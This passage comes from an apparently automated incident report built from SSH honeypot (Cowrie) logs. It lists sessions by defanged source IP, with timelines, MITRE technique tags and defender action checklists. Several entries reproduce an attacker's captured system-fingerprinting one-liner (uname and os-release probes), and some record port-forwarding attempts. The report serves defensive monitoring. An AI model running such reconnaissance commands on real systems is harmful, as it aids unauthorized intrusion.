- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-258a60e715b9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 06:51 |
| **Last Seen** | 2026-07-17 06:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:51:04` | `cowrie.session.connect` |
| `2026-07-17 06:51:05` | `cowrie.client.version` |
| `2026-07-17 06:51:05` | `cowrie.client.kex` |
| `2026-07-17 06:51:08` | `cowrie.login.success` |
| `2026-07-17 06:51:10` | `cowrie.session.params` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.success` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:10` | `cowrie.command.input` |
| `2026-07-17 06:51:11` | `cowrie.log.closed` |
| `2026-07-17 06:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e5c96c6138e

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-17 06:51 |
| **Last Seen** | 2026-07-17 06:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:51:07` | `cowrie.session.connect` |
| `2026-07-17 06:51:07` | `cowrie.client.version` |
| `2026-07-17 06:51:07` | `cowrie.client.kex` |
| `2026-07-17 06:51:09` | `cowrie.login.success` |
| `2026-07-17 06:51:09` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d24a46f7f8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 06:53 |
| **Last Seen** | 2026-07-17 06:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:53:36` | `cowrie.session.connect` |
| `2026-07-17 06:53:37` | `cowrie.client.version` |
| `2026-07-17 06:53:37` | `cowrie.client.kex` |
| `2026-07-17 06:53:41` | `cowrie.login.success` |
| `2026-07-17 06:53:43` | `cowrie.session.params` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.success` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:43` | `cowrie.command.input` |
| `2026-07-17 06:53:45` | `cowrie.log.closed` |
| `2026-07-17 06:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be06d89e5215

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-17 06:54 |
| **Last Seen** | 2026-07-17 06:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:54:37` | `cowrie.session.connect` |
| `2026-07-17 06:54:38` | `cowrie.client.version` |
| `2026-07-17 06:54:38` | `cowrie.client.kex` |
| `2026-07-17 06:54:40` | `cowrie.login.success` |
| `2026-07-17 06:54:41` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a40a762455f

| Field | Detail |
|---|---|
| **Source IP** | `117.252.93[.]114` |
| **First Seen** | 2026-07-17 06:54 |
| **Last Seen** | 2026-07-17 06:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:54:51` | `cowrie.session.connect` |
| `2026-07-17 06:54:51` | `cowrie.client.version` |
| `2026-07-17 06:54:51` | `cowrie.client.kex` |
| `2026-07-17 06:54:53` | `cowrie.login.success` |
| `2026-07-17 06:54:54` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.252.93[.]114` to AbuseIPDB if not already reported
- [ ] Block `117.252.93[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd8f1f4aafd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 06:56 |
| **Last Seen** | 2026-07-17 06:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:56:09` | `cowrie.session.connect` |
| `2026-07-17 06:56:09` | `cowrie.client.version` |
| `2026-07-17 06:56:09` | `cowrie.client.kex` |
| `2026-07-17 06:56:12` | `cowrie.login.success` |
| `2026-07-17 06:56:15` | `cowrie.session.params` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.success` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.command.input` |
| `2026-07-17 06:56:15` | `cowrie.log.closed` |
| `2026-07-17 06:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c63169bc0bd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 06:57 |
| **Last Seen** | 2026-07-17 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:57:57` | `cowrie.session.connect` |
| `2026-07-17 06:57:57` | `cowrie.client.version` |
| `2026-07-17 06:57:57` | `cowrie.client.kex` |
| `2026-07-17 06:57:58` | `cowrie.login.success` |
| `2026-07-17 06:57:58` | `cowrie.session.params` |
| `2026-07-17 06:57:58` | `cowrie.command.input` |
| `2026-07-17 06:57:59` | `cowrie.log.closed` |
| `2026-07-17 06:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5debcfb50700

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 06:58 |
| **Last Seen** | 2026-07-17 06:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:58:39` | `cowrie.session.connect` |
| `2026-07-17 06:58:39` | `cowrie.client.version` |
| `2026-07-17 06:58:39` | `cowrie.client.kex` |
| `2026-07-17 06:58:42` | `cowrie.login.success` |
| `2026-07-17 06:58:45` | `cowrie.session.params` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.success` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.command.input` |
| `2026-07-17 06:58:45` | `cowrie.log.closed` |
| `2026-07-17 06:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf4117ab56f0

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-17 06:58 |
| **Last Seen** | 2026-07-17 06:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:58:45` | `cowrie.session.connect` |
| `2026-07-17 06:58:45` | `cowrie.client.version` |
| `2026-07-17 06:58:45` | `cowrie.client.kex` |
| `2026-07-17 06:58:47` | `cowrie.login.success` |
| `2026-07-17 06:58:48` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91278cd1a19

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-07-17 06:58 |
| **Last Seen** | 2026-07-17 07:03 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:58:53` | `cowrie.session.connect` |
| `2026-07-17 06:58:53` | `cowrie.client.version` |
| `2026-07-17 06:58:53` | `cowrie.client.kex` |
| `2026-07-17 06:58:54` | `cowrie.login.success` |
| `2026-07-17 06:58:55` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20a1a24d2d9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:01 |
| **Last Seen** | 2026-07-17 07:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:01:06` | `cowrie.session.connect` |
| `2026-07-17 07:01:06` | `cowrie.client.version` |
| `2026-07-17 07:01:06` | `cowrie.client.kex` |
| `2026-07-17 07:01:09` | `cowrie.login.success` |
| `2026-07-17 07:01:11` | `cowrie.session.params` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.success` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.command.input` |
| `2026-07-17 07:01:11` | `cowrie.log.closed` |
| `2026-07-17 07:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf47920d70c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:03 |
| **Last Seen** | 2026-07-17 07:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:03:31` | `cowrie.session.connect` |
| `2026-07-17 07:03:32` | `cowrie.client.version` |
| `2026-07-17 07:03:32` | `cowrie.client.kex` |
| `2026-07-17 07:03:34` | `cowrie.login.success` |
| `2026-07-17 07:03:36` | `cowrie.session.params` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.success` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.command.input` |
| `2026-07-17 07:03:36` | `cowrie.log.closed` |
| `2026-07-17 07:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f30d6e27bdd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:08 |
| **Last Seen** | 2026-07-17 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:08:18` | `cowrie.session.connect` |
| `2026-07-17 07:08:18` | `cowrie.client.version` |
| `2026-07-17 07:08:18` | `cowrie.client.kex` |
| `2026-07-17 07:08:19` | `cowrie.login.success` |
| `2026-07-17 07:08:21` | `cowrie.session.params` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.success` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.command.input` |
| `2026-07-17 07:08:21` | `cowrie.log.closed` |
| `2026-07-17 07:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27339741a629

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:10 |
| **Last Seen** | 2026-07-17 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:10:51` | `cowrie.session.connect` |
| `2026-07-17 07:10:51` | `cowrie.client.version` |
| `2026-07-17 07:10:51` | `cowrie.client.kex` |
| `2026-07-17 07:10:53` | `cowrie.login.success` |
| `2026-07-17 07:10:54` | `cowrie.session.params` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.success` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.command.input` |
| `2026-07-17 07:10:54` | `cowrie.log.closed` |
| `2026-07-17 07:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2132efbdec5

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-07-17 07:11 |
| **Last Seen** | 2026-07-17 07:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:11:15` | `cowrie.session.connect` |
| `2026-07-17 07:11:16` | `cowrie.client.version` |
| `2026-07-17 07:11:16` | `cowrie.client.kex` |
| `2026-07-17 07:11:18` | `cowrie.login.success` |
| `2026-07-17 07:11:19` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1145925ccede

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-17 07:11 |
| **Last Seen** | 2026-07-17 07:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:11:25` | `cowrie.session.connect` |
| `2026-07-17 07:11:25` | `cowrie.client.version` |
| `2026-07-17 07:11:25` | `cowrie.client.kex` |
| `2026-07-17 07:11:28` | `cowrie.login.success` |
| `2026-07-17 07:11:29` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c4b8960a14

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 07:11 |
| **Last Seen** | 2026-07-17 07:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:11:56` | `cowrie.session.connect` |
| `2026-07-17 07:11:56` | `cowrie.client.version` |
| `2026-07-17 07:11:56` | `cowrie.client.kex` |
